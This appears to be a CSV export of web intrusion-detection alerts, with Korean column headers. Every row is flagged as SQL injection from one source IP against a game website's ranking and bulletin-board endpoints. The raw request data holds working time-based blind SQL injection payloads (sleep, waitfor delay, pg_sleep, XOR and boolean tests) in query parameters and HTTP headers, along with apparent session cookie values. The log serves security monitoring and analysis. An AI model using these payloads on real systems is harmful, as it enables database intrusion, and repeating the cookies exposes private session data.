장비발생시간,출발지IP,목적지IP,목적지포트,공격명,raw_data
2019-03-13 10:14,203.246.171.140,139.150.87.138,80,SQL Injection," /world/tower/rank?cate=0&classCode=ac&serverKey=(select(0)from(select(sleep(3)))v)/*'%2B(select(0)from(select(sleep(3)))v)%2B'""%2B(select(0)from(select(sleep(3)))v)%2B""*/"
2019-03-13 10:16,203.246.171.140,139.150.87.138,80,SQL Injection, /world/tower/rank?cate=0&classCode=pr&serverKey=0'XOR(if(now()=sysdate()%2Csleep(9)%2C0))XOR'Z
2019-03-13 10:16,203.246.171.140,139.150.87.138,80,SQL Injection," /world/tower/rank?cate=0&classCode=pr&serverKey=0""XOR(if(now()=sysdate()%2Csleep(3)%2C0))XOR""Z"
2019-03-13 10:16,203.246.171.140,139.150.87.138,80,SQL Injection," /world/tower/rank?cate=0&classCode=pr&serverKey=(select(0)from(select(sleep(3)))v)/*'%2B(select(0)from(select(sleep(3)))v)%2B'""%2B(select(0)from(select(sleep(3)))v)%2B""*/"
2019-03-13 10:04,203.246.171.140,139.150.87.138,80,SQL Injection, /wwc-bbs/article/read?_=1552434432270&artSeq=0'XOR(if(now()=sysdate()%2Csleep(3)%2C0))XOR'Z&ctgNo=14
2019-03-13 10:04,203.246.171.140,139.150.87.138,80,SQL Injection," /wwc-bbs/article/read?_=1552434432270&artSeq=0""XOR(if(now()=sysdate()%2Csleep(3)%2C0))XOR""Z&ctgNo=14"
2019-03-13 10:04,203.246.171.140,139.150.87.138,80,SQL Injection," /wwc-bbs/article/read?_=1552434432270&artSeq=(select(0)from(select(sleep(3)))v)/*'%2B(select(0)from(select(sleep(3)))v)%2B'""%2B(select(0)from(select(sleep(3)))v)%2B""*/&ctgNo=14"
2019-03-13 10:05,203.246.171.140,139.150.87.138,80,SQL Injection, /wwc-bbs/article/read?_=1552434432270&artSeq=aIs1WTbm';%20waitfor%20delay%20'0:0:3'%20--%20&ctgNo=14
2019-03-13 10:05,203.246.171.140,139.150.87.138,80,SQL Injection, /world/tower/rank?cate=0&classCode=0'XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR'Z&serverKey=3
2019-03-13 10:05,203.246.171.140,139.150.87.138,80,SQL Injection," /world/tower/rank?cate=0&classCode=gd""%20AND%202*3*8=6*8%20AND%20""NcHJ""=""NcHJ&serverKey=3"
2019-03-13 10:05,203.246.171.140,139.150.87.138,80,SQL Injection, /world/tower/rank?cate=0&classCode=gd'%20AND%202*3*8=6*8%20AND%20'S3d3'='S3d3&serverKey=3
2019-03-13 10:05,203.246.171.140,139.150.87.138,80,SQL Injection, /world/tower/rank?cate=0&classCode=sXurQdpd'));select%20pg_sleep(9);%20--%20&serverKey=3
2019-03-13 10:08,203.246.171.140,139.150.87.138,80,SQL Injection, /world/tower/rank?cate=CMhNbpbJ';%20waitfor%20delay%20'0:0:6'%20--%20&classCode=pr&serverKey=1
2019-03-13 10:07,203.246.171.140,139.150.87.138,80,SQL Injection, /world/tower/rank?cate=0&classCode=arB57vS1';%20waitfor%20delay%20'0:0:9'%20--%20&serverKey=2
2019-03-13 10:07,203.246.171.140,139.150.87.138,80,SQL Injection, /world/tower/rank?cate=0&classCode=DUNz3mfn'));select%20pg_sleep(3);%20--%20&serverKey=2
2019-03-13 10:07,203.246.171.140,139.150.87.138,80,SQL Injection, /world/tower/rank?cate=0&classCode=XsVfJV1f';select%20pg_sleep(9);%20--%20&serverKey=2
2019-03-13 10:07,203.246.171.140,139.150.87.138,80,SQL Injection, /world/tower/rank?cate=0&classCode=jepez7Bl');select%20pg_sleep(9);%20--%20&serverKey=2
2019-03-13 10:03,203.246.171.140,139.150.87.138,80,SQL Injection, /world/tower/rank?cate=dt8Mxpz0';%20waitfor%20delay%20'0:0:3'%20--%20&classCode=gd&serverKey=3
2019-03-13 10:02,203.246.171.140,139.150.87.138,80,SQL Injection, /world/tower/rank?cate=0'XOR(if(now()=sysdate()%2Csleep(9)%2C0))XOR'Z&classCode=gd&serverKey=3
2019-03-13 10:02,203.246.171.140,139.150.87.138,80,SQL Injection," /world/tower/rank?cate=0""XOR(if(now()=sysdate()%2Csleep(9)%2C0))XOR""Z&classCode=gd&serverKey=3"
2019-03-13 10:02,203.246.171.140,139.150.87.138,80,SQL Injection," /world/tower/rank?cate=(select(0)from(select(sleep(9)))v)/*'%2B(select(0)from(select(sleep(9)))v)%2B'""%2B(select(0)from(select(sleep(9)))v)%2B""*/&classCode=gd&serverKey=3"
2019-03-13 10:11,203.246.171.140,139.150.87.138,80,SQL Injection, /wwc-bbs/article/list?_=114&ctgNo=&ctgNo=T&searchText=icarus&searchType=1552432819469&svcId=0'XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR'Z
2019-03-13 10:11,203.246.171.140,139.150.87.138,80,SQL Injection, /wwc-bbs/article/list?_=1552434321438&ctgNo=0'XOR(if(now()=sysdate()%2Csleep(9)%2C0))XOR'Z
2019-03-13 10:11,203.246.171.140,139.150.87.138,80,SQL Injection," /wwc-bbs/article/list?_=114&ctgNo=&ctgNo=T&searchText=icarus&searchType=1552432819469&svcId=0""XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR""Z"
2019-03-13 10:11,203.246.171.140,139.150.87.138,80,SQL Injection," /wwc-bbs/article/list?_=114&ctgNo=&ctgNo=T&searchText=icarus&searchType=1552432819469&svcId=(select(0)from(select(sleep(9)))v)/*'%2B(select(0)from(select(sleep(9)))v)%2B'""%2B(select(0)from(select(sleep(9)))v)%2B""*/"
2019-03-13 10:11,203.246.171.140,139.150.87.138,80,SQL Injection," /wwc-bbs/article/list?_=1552434321438&ctgNo=0""XOR(if(now()=sysdate()%2Csleep(9)%2C0))XOR""Z"
2019-03-13 10:15,203.246.171.140,139.150.87.138,80,SQL Injection, /wwc-bbs/article/read?_=1552434432270&artSeq=1433327&ctgNo=uayvVM9d';%20waitfor%20delay%20'0:0:6'%20--%20
2019-03-13 10:15,203.246.171.140,139.150.87.138,80,SQL Injection, /world/tower/rank?cate=0&classCode=ac&serverKey=Xn9Ge5jW';%20waitfor%20delay%20'0:0:9'%20--%20
2019-03-13 10:03,203.246.171.140,139.150.87.138,80,SQL Injection," /world/tower/rank?cate=0&classCode=wz&serverKey=0""XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR""Z"
2019-03-13 10:04,203.246.171.140,139.150.87.138,80,SQL Injection, /world/tower/rank?cate=0&classCode=wz&serverKey=BmIoEOkY';%20waitfor%20delay%20'0:0:6'%20--%20
2019-03-13 10:03,203.246.171.140,139.150.87.138,80,SQL Injection, /world/tower/rank?cate=0&classCode=wz&serverKey=0'XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR'Z
2019-03-13 10:03,203.246.171.140,139.150.87.138,80,SQL Injection," /world/tower/rank?cate=0&classCode=wz&serverKey=(select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'""%2B(select(0)from(select(sleep(6)))v)%2B""*/"
2019-03-13 10:38,203.246.171.140,139.150.87.138,80,SQL Injection," /wwc-bbs/article/list?_=19&ctgNo=&ctgNo=T&searchText=-1""%20OR%202%2B671-671-1=0%2B0%2B0%2B1%20--%20&searchType=1552434321438&svcId=19"
2019-03-13 10:38,203.246.171.140,139.150.87.138,80,SQL Injection, /wwc-bbs/article/list?_=19&ctgNo=&ctgNo=T&searchText=0'XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR'Z&searchType=1552434321438&svcId=19
2019-03-13 10:38,203.246.171.140,139.150.87.138,80,SQL Injection," /wwc-bbs/article/list?_=19&ctgNo=&ctgNo=T&searchText=0""XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR""Z&searchType=1552434321438&svcId=19"
2019-03-13 10:38,203.246.171.140,139.150.87.138,80,SQL Injection," /wwc-bbs/article/list?_=19&ctgNo=&ctgNo=T&searchText=(select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'""%2B(select(0)from(select(sleep(6)))v)%2B""*/&searchType=1552434321438&svcId=19"
2019-03-13 10:39,203.246.171.140,139.150.87.138,80,SQL Injection, /wwc-bbs/article/list?_=19&ctgNo=&ctgNo=T&searchText=f5d3p11t';%20waitfor%20delay%20'0:0:6'%20--%20&searchType=1552434321438&svcId=19
2019-03-13 10:35,203.246.171.140,139.150.87.138,80,SQL Injection, /wwc-bbs/article/read?_=14&artSeq=the&ctgNo=T&ctgNo=icarus&searchText=IUXfYpH3';%20waitfor%20delay%20'0:0:9'%20--%20&searchType=1433327&svcId=14
2019-03-13 10:07,203.246.171.140,139.150.87.138,80,SQL Injection, /world/tower/rank?cate=0'XOR(if(now()=sysdate()%2Csleep(9)%2C0))XOR'Z&classCode=pr&serverKey=1
2019-03-13 10:07,203.246.171.140,139.150.87.138,80,SQL Injection," /world/tower/rank?cate=0""XOR(if(now()=sysdate()%2Csleep(9)%2C0))XOR""Z&classCode=pr&serverKey=1"
2019-03-13 10:07,203.246.171.140,139.150.87.138,80,SQL Injection," /world/tower/rank?cate=(select(0)from(select(sleep(9)))v)/*'%2B(select(0)from(select(sleep(9)))v)%2B'""%2B(select(0)from(select(sleep(9)))v)%2B""*/&classCode=pr&serverKey=1"
2019-03-13 10:06,203.246.171.140,139.150.87.138,80,SQL Injection," /wwc-bbs/article/list?_=114&ctgNo=the&ctgNo=(select(0)from(select(sleep(3)))v)/*'%2B(select(0)from(select(sleep(3)))v)%2B'""%2B(select(0)from(select(sleep(3)))v)%2B""*/&searchText=icarus&searchType=1552432819469&svcId=114"
2019-03-13 10:06,203.246.171.140,139.150.87.138,80,SQL Injection, /wwc-bbs/article/list?_=114&ctgNo=the&ctgNo=0'XOR(if(now()=sysdate()%2Csleep(3)%2C0))XOR'Z&searchText=icarus&searchType=1552432819469&svcId=114
2019-03-13 10:06,203.246.171.140,139.150.87.138,80,SQL Injection," /wwc-bbs/article/list?_=114&ctgNo=the&ctgNo=0""XOR(if(now()=sysdate()%2Csleep(3)%2C0))XOR""Z&searchText=icarus&searchType=1552432819469&svcId=114"
2019-03-13 10:17,203.246.171.140,139.150.87.138,80,SQL Injection, /world/tower/rank?cate=0&classCode=pr&serverKey=ZdU7l7DI';%20waitfor%20delay%20'0:0:6'%20--%20
2019-03-13 10:27,203.246.171.140,139.150.87.138,80,SQL Injection," /world/tower/rank?cate=0&classCode=mg&serverKey=0""XOR(if(now()=sysdate()%2Csleep(3)%2C0))XOR""Z"
2019-03-13 10:27,203.246.171.140,139.150.87.138,80,SQL Injection," /world/tower/rank?cate=0&classCode=mg&serverKey=(select(0)from(select(sleep(3)))v)/*'%2B(select(0)from(select(sleep(3)))v)%2B'""%2B(select(0)from(select(sleep(3)))v)%2B""*/"
2019-03-13 10:28,203.246.171.140,139.150.87.138,80,SQL Injection, /world/tower/rank?cate=0&classCode=mg&serverKey=qtTrf6bp';%20waitfor%20delay%20'0:0:9'%20--%20
2019-03-13 10:31,203.246.171.140,139.150.87.138,80,SQL Injection, /wwc-bbs/article/list?_=19&ctgNo=&ctgNo=gIuQAjNg';%20waitfor%20delay%20'0:0:9'%20--%20&searchText=icarus&searchType=1552434321438&svcId=19
2019-03-13 10:31,203.246.171.140,139.150.87.138,80,SQL Injection," /wwc-bbs/article/list?_=19&ctgNo=&ctgNo=(select(0)from(select(sleep(9)))v)/*'%2B(select(0)from(select(sleep(9)))v)%2B'""%2B(select(0)from(select(sleep(9)))v)%2B""*/&searchText=icarus&searchType=1552434321438&svcId=19"
2019-03-13 10:31,203.246.171.140,139.150.87.138,80,SQL Injection, /wwc-bbs/article/list?_=19&ctgNo=&ctgNo=0'XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR'Z&searchText=icarus&searchType=1552434321438&svcId=19
2019-03-13 10:31,203.246.171.140,139.150.87.138,80,SQL Injection," /wwc-bbs/article/list?_=19&ctgNo=&ctgNo=0""XOR(if(now()=sysdate()%2Csleep(9)%2C0))XOR""Z&searchText=icarus&searchType=1552434321438&svcId=19"
2019-03-13 10:41,203.246.171.140,139.150.87.138,80,SQL Injection, /wwc-bbs/article/read?_=14&artSeq=the&ctgNo=T&ctgNo=icarus&searchText=1552434431767&searchType=1433327&svcId=0'XOR(if(now()=sysdate()%2Csleep(9)%2C0))XOR'Z
2019-03-13 10:41,203.246.171.140,139.150.87.138,80,SQL Injection, /wwc-bbs/article/read?_=14&artSeq=the&ctgNo=T&ctgNo=icarus&searchText=1552434431767&searchType=1433327&svcId=-1'%20OR%202%2B714-714-1=0%2B0%2B0%2B1%20--%20
2019-03-13 10:41,203.246.171.140,139.150.87.138,80,SQL Injection, /wwc-bbs/article/read?_=14&artSeq=the&ctgNo=T&ctgNo=icarus&searchText=1552434431767&searchType=1433327&svcId=-1'%20OR%202%2B68-68-1=0%2B0%2B0%2B1%20or%20'SNKtaGvc'='
2019-03-13 10:41,203.246.171.140,139.150.87.138,80,SQL Injection," /wwc-bbs/article/read?_=14&artSeq=the&ctgNo=T&ctgNo=icarus&searchText=1552434431767&searchType=1433327&svcId=-1""%20OR%202%2B796-796-1=0%2B0%2B0%2B1%20--%20"
2019-03-13 10:23,203.246.171.140,139.150.87.138,80,SQL Injection, /wwc-bbs/article/list?_=19&ctgNo=Bkv7jCOn';%20waitfor%20delay%20'0:0:6'%20--%20&ctgNo=T&searchText=icarus&searchType=1552434321438&svcId=19
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection, /wwc-bbs/article/read?_=-1;select%20pg_sleep(6);%20--%20&artSeq=1433327&ctgNo=14
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection, /wwc-bbs/article/read?_=-1);select%20pg_sleep(6);%20--%20&artSeq=1433327&ctgNo=14
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection, /wwc-bbs/article/read?_=DKCetnCn';select%20pg_sleep(6);%20--%20&artSeq=1433327&ctgNo=14
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection, /wwc-bbs/article/read?_=4P8RNYDq');select%20pg_sleep(9);%20--%20&artSeq=1433327&ctgNo=14
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection, /wwc-bbs/article/read?_=KTC214B0'));select%20pg_sleep(9);%20--%20&artSeq=1433327&ctgNo=14
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /wwc-bbs/article/read HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012X-Forwarded-Host: 0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /wwc-bbs/article/read HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012X-Forwarded-Host: 0""XOR(if(now()=sysdate(),sleep(3),0))XOR""Z#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /wwc-bbs/article/read HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012X-Forwarded-Host: (select(0)from(select(sleep(3)))v)/*'+(select(0)from(select(sleep(3)))v)+'""+(select(0)from(select(sleep(3)))v)+""*/#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /wwc-bbs/article/read HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012X-Forwarded-Host: -1; waitfor delay '0:0:3' --#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /world/tower/rank HTTP/1.1#015#012Referer: Epu5HZty'; waitfor delay '0:0:3' --#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.6674"
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /world/tower/rank HTTP/1.1#015#012Referer: f1cSpF0A');select pg_sleep(3); --#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.6674"
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection, GET /world/tower/rank HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: QTT2Mb0A'; waitfor delay '0:0:6' --#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection, GET /world/tower/rank HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: 5kVq3eu5';select pg_sleep(9); --#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection, GET /world/tower/rank HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: PHCK9ONP');select pg_sleep(9); --#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection, GET /world/tower/rank HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: RuHJhBlP'));select pg_sleep(9); --#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /world/tower/rank HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012Client-IP: 0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
